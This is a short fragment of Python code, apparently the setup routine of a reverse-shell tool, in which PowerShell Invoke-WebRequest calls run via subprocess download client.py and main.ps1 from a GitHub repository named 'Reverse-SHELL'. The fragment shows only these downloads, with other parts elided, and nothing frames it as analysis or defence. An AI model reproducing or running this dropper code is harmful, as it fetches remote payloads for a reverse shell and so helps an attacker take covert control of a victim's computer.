...
def setup():
    ...
    subprocess.call(
        f'invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile {file_path}',
        shell=True)
    # download main.ps1 file
    subprocess.call(
        f'invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.ps1" -outfile {ps1_path}',
        shell=True)
